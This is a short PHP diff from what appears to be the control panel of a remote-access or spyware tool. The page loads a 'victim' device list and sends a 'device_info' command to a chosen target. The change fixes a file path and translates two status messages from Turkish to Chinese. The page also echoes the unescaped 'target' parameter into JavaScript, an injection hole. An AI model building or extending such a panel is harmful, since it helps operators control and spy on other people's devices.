@@ -1,6 +1,6 @@
 <?php 
 require_once 'module_controller.php';
-$strJsonFileContents = file_get_contents("../private/storage/device_list.json");
+$strJsonFileContents = file_get_contents("./private/storage/device_list.json");
 $victim_array = json_decode($strJsonFileContents, true);
 $device_id = $_GET['target'];
 
@@ -103,13 +103,13 @@ $device_id = $_GET['target'];
         $.post( "commands.php", { send_command: true, target:"<?php echo $_GET['target'];?>", type: "device_info", value: true}, function( data, err ) {
             if (data.status){
                 Toastify({
-                    text: "Komut gönderildi.!",
+                    text: "命令已发送！",
                     backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                     className: "info",
                 }).showToast();
             } else {
                 Toastify({
-                    text: "Komut başarısız.!",
+                    text: "命令发送失败！",
                     backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                     className: "info",
                 }).showToast();
